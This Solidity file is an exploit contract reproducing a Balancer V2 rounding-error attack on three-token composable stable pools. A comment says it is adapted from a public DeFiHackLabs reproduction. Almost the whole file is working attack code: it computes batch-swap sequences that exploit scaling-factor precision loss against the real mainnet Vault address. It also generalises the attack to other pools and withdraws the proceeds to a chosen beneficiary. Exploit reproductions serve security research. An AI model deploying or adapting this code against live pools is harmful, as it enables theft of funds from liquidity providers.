// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./interfaces.sol";
import "./math/FixedPoint.sol";
import "./StableMath.sol";

// Adapted from the public DeFiHackLabs reproduction of the 2025-11-03 Balancer V2 exploit
// (src/test/2025-11/BalancerV2_exp.sol). Modified: parametrized beneficiary, guards for
// pools without a rate pivot, and per-attempt isolation (used only on local forks).

contract Helper {
    using FixedPoint for uint256;

    function swapGivenOut(
        uint256[] memory balances,
        uint256[] memory scalingFactors,
        uint256 tokenIndexIn,
        uint256 tokenIndexOut,
        uint256 tokenAmountOut,
        uint256 amplificationParameter,
        uint256 swapFee
    ) public pure returns (uint256[] memory) {
        uint256 n = balances.length;
        uint256[] memory balanceScaled = new uint256[](n);
        for (uint256 i = 0; i < n; i++) {
            balanceScaled[i] = FixedPoint.mulDown(balances[i], scalingFactors[i]);
        }

        uint256 invariant = StableMath._calculateInvariant(amplificationParameter, balanceScaled);
        uint256 amountOutScaled = FixedPoint.mulDown(tokenAmountOut, scalingFactors[tokenIndexOut]); // precision loss here
        uint256 amountInScaled = StableMath._calcInGivenOut(
            amplificationParameter,
            balanceScaled,
            tokenIndexIn,
            tokenIndexOut,
            amountOutScaled,
            invariant
        );
        uint256 rawAmountIn = FixedPoint.divUp(amountInScaled, scalingFactors[tokenIndexIn]);
        uint256 amountInWithFee = FixedPoint.divUp(rawAmountIn, FixedPoint.ONE.sub(swapFee));

        balances[tokenIndexOut] = balances[tokenIndexOut].sub(tokenAmountOut);
        balances[tokenIndexIn] = balances[tokenIndexIn].add(amountInWithFee);

        return balances;
    }

    function get_trickAmt(uint256 scalingfactor) public pure returns (uint256 trickAmt) {
        if (scalingfactor <= 1e18) return 0;
        uint256 denom = ((scalingfactor - 1e18) * 10000) / 1e18;
        if (denom == 0) return 0;
        trickAmt = 10000 / denom;
    }

    function get_index(
        address[] memory tokens,
        uint256[] memory balances,
        uint256 bptIndex
    ) public pure returns (uint256 idx) {
        idx = 0;
        uint256 maxbalance = 0;
        for (uint256 i = 0; i < tokens.length; i++) {
            if (i == bptIndex) continue;
            if (balances[i] > maxbalance) {
                maxbalance = balances[i];
                idx = i;
            }
        }
        return idx;
    }

    function concat_steps(
        IBalancerVault.BatchSwapStep[] memory a,
        IBalancerVault.BatchSwapStep[] memory b
    ) public pure returns (IBalancerVault.BatchSwapStep[] memory) {
        IBalancerVault.BatchSwapStep[] memory c = new IBalancerVault.BatchSwapStep[](a.length + b.length);
        uint256 k = 0;
        for (uint256 i = 0; i < a.length; i++) c[k++] = a[i];
        for (uint256 i = 0; i < b.length; i++) c[k++] = b[i];
        return c;
    }

    function get_amount(uint256 actualSupply) public pure returns (uint256) {
        uint256 a = uint256(actualSupply * 10030 / 10000);
        return uint256((a - get_base(a)) / 2) + 1;
    }

    function get_base(uint256 v) public pure returns (uint256 base) {
        base = 1e4;
        while (base * 1e3 < v) base = base * 1e3;
        return base;
    }

    function trim(uint256 n) public pure returns (uint256) {
        if (n < 100) return n;
        uint256 initBalance = n;
        uint256 pow = 1;
        while (initBalance > 100) {
            initBalance = initBalance / 10;
            pow = pow * 10;
        }
        return n / pow * pow;
    }
}

contract AttackerC {
    IBalancerVault public constant vault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    Helper public helper = new Helper();

    uint256 constant MAX_STEPS = 300;

    function prepare_phase1_steps(
        bytes32 poolId,
        address[] memory tokens,
        uint256[] memory balances,
        uint256 bptIndex,
        uint256 initBalance
    ) public pure returns (IBalancerVault.BatchSwapStep[] memory steps) {
        IBalancerVault.BatchSwapStep[] memory buffer = new IBalancerVault.BatchSwapStep[](MAX_STEPS);
        uint256[] memory preAmount = new uint256[](tokens.length);
        uint256[] memory sumAmounts = new uint256[](tokens.length);

        uint256 amount;
        uint256 nextAmount;
        bool exit = false;
        uint256 stepCount = 0;
        while (!exit) {
            for (uint256 assetOutIndex = 0; assetOutIndex < tokens.length; assetOutIndex++) {
                if (assetOutIndex == bptIndex) continue;
                if (preAmount[assetOutIndex] == 0) {
                    amount = 99 * balances[assetOutIndex] - 99 * initBalance;
                } else {
                    amount = preAmount[assetOutIndex] - 99 * uint256(preAmount[assetOutIndex] / 100);
                }
                preAmount[assetOutIndex] = amount;
                amount = amount / 100;
                nextAmount = preAmount[assetOutIndex] - 99 * uint256(preAmount[assetOutIndex] / 100);
                if (nextAmount < 100) {
                    exit = true;
                    amount = balances[assetOutIndex] - sumAmounts[assetOutIndex] - initBalance;
                } else {
                    sumAmounts[assetOutIndex] += amount;
                }

                buffer[stepCount] = IBalancerVault.BatchSwapStep({
                    poolId: poolId,
                    assetInIndex: bptIndex, // BPT
                    assetOutIndex: assetOutIndex,
                    amount: amount,
                    userData: bytes("")
                });
                stepCount++;
                if (stepCount >= MAX_STEPS) {
                    exit = true;
                    break;
                }
            }
        }

        IBalancerVault.BatchSwapStep[] memory out = new IBalancerVault.BatchSwapStep[](stepCount);
        for (uint256 i = 0; i < stepCount; i++) out[i] = buffer[i];
        return out;
    }

    function prepare_phase2_steps(
        bytes32 poolId,
        uint256[] memory scalingFactors,
        uint256 amplificationParameter,
        uint256 swapFee,
        uint256 maxRounds,
        uint256 initBalance,
        uint256 trickAmt,
        uint256 tokenIndexIn,
        uint256 tokenIndexOut,
        uint256 indexIn,
        uint256 indexOut
    ) public view returns (IBalancerVault.BatchSwapStep[] memory steps) {
        IBalancerVault.BatchSwapStep[] memory buffer = new IBalancerVault.BatchSwapStep[](MAX_STEPS);
        uint256[] memory balances = new uint256[](2);
        balances[0] = initBalance;
        balances[1] = initBalance;
        uint256 amount = balances[1];
        uint256 stepCount = 0;
        for (uint256 round = 0; round < maxRounds; ++round) {
            balances = helper.swapGivenOut(
                balances, scalingFactors, tokenIndexIn, tokenIndexOut, amount - trickAmt - 1, amplificationParameter, swapFee);
            if (stepCount >= MAX_STEPS) break;
            buffer[stepCount++] = IBalancerVault.BatchSwapStep({
                poolId: poolId,
                assetInIndex: indexIn,
                assetOutIndex: indexOut,
                amount: amount - trickAmt - 1,
                userData: bytes("")
            });

            balances = helper.swapGivenOut(
                balances, scalingFactors, tokenIndexIn, tokenIndexOut, trickAmt, amplificationParameter, swapFee);
            if (stepCount >= MAX_STEPS) break;
            buffer[stepCount++] = IBalancerVault.BatchSwapStep({
                poolId: poolId,
                assetInIndex: indexIn,
                assetOutIndex: indexOut,
                amount: trickAmt,
                userData: bytes("")
            });
            amount = helper.trim(balances[tokenIndexIn]);
            for (uint256 j = 0; j < 3; ++j) {
                if (stepCount >= MAX_STEPS) break;
                try helper.swapGivenOut(
                    balances, scalingFactors, tokenIndexOut, tokenIndexIn, amount, amplificationParameter, swapFee
                ) returns (uint256[] memory newBalances) {
                    buffer[stepCount++] = IBalancerVault.BatchSwapStep({
                        poolId: poolId,
                        assetInIndex: indexOut,
                        assetOutIndex: indexIn,
                        amount: amount,
                        userData: bytes("")
                    });
                    balances = newBalances;
                    amount = balances[tokenIndexOut];
                    break;
                } catch {
                    amount = (amount * 9) / 10;
                }
            }
        }
        IBalancerVault.BatchSwapStep[] memory out = new IBalancerVault.BatchSwapStep[](stepCount);
        for (uint256 i = 0; i < stepCount; i++) out[i] = buffer[i];
        return out;
    }

    function prepare_phase3_steps(bytes32 poolId, uint256 actualSupply)
        public
        view
        returns (IBalancerVault.BatchSwapStep[] memory steps)
    {
        IBalancerVault.BatchSwapStep[] memory buffer = new IBalancerVault.BatchSwapStep[](MAX_STEPS);
        uint256 amount = 1e4;
        uint256 stepCount = 0;
        for (uint256 round = 0; round < 3; ++round) {
            buffer[stepCount++] = IBalancerVault.BatchSwapStep({
                poolId: poolId, assetInIndex: 0, assetOutIndex: 1, amount: amount, userData: bytes("")
            });
            amount = amount * 1e3;
            buffer[stepCount++] = IBalancerVault.BatchSwapStep({
                poolId: poolId, assetInIndex: 2, assetOutIndex: 1, amount: amount, userData: bytes("")
            });
            amount = amount * 1e3;
        }
        buffer[stepCount++] = IBalancerVault.BatchSwapStep({
            poolId: poolId, assetInIndex: 0, assetOutIndex: 1, amount: amount, userData: bytes("")
        });
        amount = helper.get_amount(actualSupply);
        buffer[stepCount++] = IBalancerVault.BatchSwapStep({
            poolId: poolId, assetInIndex: 2, assetOutIndex: 1, amount: amount, userData: bytes("")
        });
        buffer[stepCount++] = IBalancerVault.BatchSwapStep({
            poolId: poolId, assetInIndex: 0, assetOutIndex: 1, amount: amount, userData: bytes("")
        });
        IBalancerVault.BatchSwapStep[] memory out = new IBalancerVault.BatchSwapStep[](stepCount);
        for (uint256 i = 0; i < stepCount; i++) out[i] = buffer[i];
        return out;
    }

    /// @notice Run the Nov-2025 rounding exploit against `pool`. Requires a 3-token CSP.
    /// The batchSwap `assets` array is reordered so BPT sits at index 1; the pool's registered
    /// token order (used internally by the Vault/pool math) is untouched.
    /// @param initBalance residual balance left in each non-BPT token after phase 1.
    function attack(address pool, uint256 initBalance, uint256 loops) public {
        bytes32 poolId = ICSP(pool).getPoolId();
        uint256 bptIndex = ICSP(pool).getBptIndex();
        (address[] memory tokens, uint256[] memory poolBalances, ) = vault.getPoolTokens(poolId);
        require(tokens.length == 3, "3-token CSP only");

        for (uint256 i = 0; i < tokens.length; i++) {
            IERC20(tokens[i]).approve(address(vault), type(uint256).max);
        }

        uint256[] memory sfPool = ICSP(pool).getScalingFactors();

        // Caller-side arrays with BPT at index 1.
        address[] memory assets = new address[](3);
        uint256[] memory balances = new uint256[](3);
        uint256[] memory sf = new uint256[](3);
        if (bptIndex == 1) {
            for (uint256 i = 0; i < 3; i++) {
                assets[i] = tokens[i];
                balances[i] = poolBalances[i];
                sf[i] = sfPool[i];
            }
        } else if (bptIndex == 0) {
            assets[0] = tokens[1];
            assets[1] = tokens[0];
            assets[2] = tokens[2];
            balances[0] = poolBalances[1];
            balances[1] = poolBalances[0];
            balances[2] = poolBalances[2];
            sf[0] = sfPool[1];
            sf[1] = sfPool[0];
            sf[2] = sfPool[2];
        } else {
            assets[0] = tokens[0];
            assets[1] = tokens[2];
            assets[2] = tokens[1];
            balances[0] = poolBalances[0];
            balances[1] = poolBalances[2];
            balances[2] = poolBalances[1];
            sf[0] = sfPool[0];
            sf[1] = sfPool[2];
            sf[2] = sfPool[1];
        }

        // pivot = larger of the two non-BPT balances (assets-space index 0 or 2)
        uint256 idx = balances[0] >= balances[2] ? 0 : 2;
        try ICSP(pool).updateTokenRateCache(assets[idx]) {} catch {}
        uint256 trickAmt = helper.get_trickAmt(sf[idx]);
        require(trickAmt > 0, "no rate pivot");

        // Re-read scaling factors after the (possible) rate-cache refresh, as the pool does.
        sfPool = ICSP(pool).getScalingFactors();
        if (bptIndex == 1) {
            sf[0] = sfPool[0];
            sf[2] = sfPool[2];
        } else if (bptIndex == 0) {
            sf[0] = sfPool[1];
            sf[2] = sfPool[2];
        } else {
            sf[0] = sfPool[0];
            sf[2] = sfPool[1];
        }

        uint256 indexIn = 0;
        uint256 indexOut = 2;
        uint256 tokenIndexIn = 0;
        uint256 tokenIndexOut = 1;
        if (idx == 0) {
            indexIn = 2;
            indexOut = 0;
            tokenIndexIn = 1;
            tokenIndexOut = 0;
        }

        (uint256 amplificationParameter, , ) = ICSP(pool).getAmplificationParameter();
        uint256 swapFeePercentage = ICSP(pool).getSwapFeePercentage();
        uint256 actualSupply = ICSP(pool).getActualSupply();

        IBalancerVault.BatchSwapStep[] memory phase1 = prepare_phase1_steps(poolId, assets, balances, 1, initBalance);

        uint256[] memory newScalingFactors = new uint256[](2);
        newScalingFactors[0] = sf[0];
        newScalingFactors[1] = sf[2];

        IBalancerVault.BatchSwapStep[] memory phase2 = prepare_phase2_steps(
            poolId,
            newScalingFactors,
            amplificationParameter,
            swapFeePercentage,
            loops,
            initBalance,
            trickAmt,
            tokenIndexIn,
            tokenIndexOut,
            indexIn,
            indexOut
        );
        IBalancerVault.BatchSwapStep[] memory phase3 = prepare_phase3_steps(poolId, actualSupply);
        IBalancerVault.BatchSwapStep[] memory steps = helper.concat_steps(helper.concat_steps(phase1, phase2), phase3);

        int256[] memory limits = new int256[](3);
        for (uint256 i = 0; i < 3; i++) {
            limits[i] = 0x400000000000000000000000000000000000000000000000000000000000000;
        }

        vault.batchSwap(
            IBalancerVault.SwapKind.GIVEN_OUT,
            steps,
            assets,
            IBalancerVault.FundManagement({
                sender: address(this),
                fromInternalBalance: true,
                recipient: payable(address(this)),
                toInternalBalance: true
            }),
            limits,
            block.timestamp
        );
    }

    function withdraw(address pool, address beneficiary) public {
        bytes32 poolId = ICSP(pool).getPoolId();
        (address[] memory tokens, , ) = vault.getPoolTokens(poolId);
        uint256[] memory balances = vault.getInternalBalance(address(this), tokens);
        IBalancerVault.UserBalanceOp[] memory ops = new IBalancerVault.UserBalanceOp[](tokens.length);
        for (uint256 i = 0; i < tokens.length; i++) {
            ops[i] = IBalancerVault.UserBalanceOp({
                kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL,
                asset: tokens[i],
                amount: balances[i],
                sender: address(this),
                recipient: payable(beneficiary)
            });
        }
        vault.manageUserBalance(ops);
    }
}
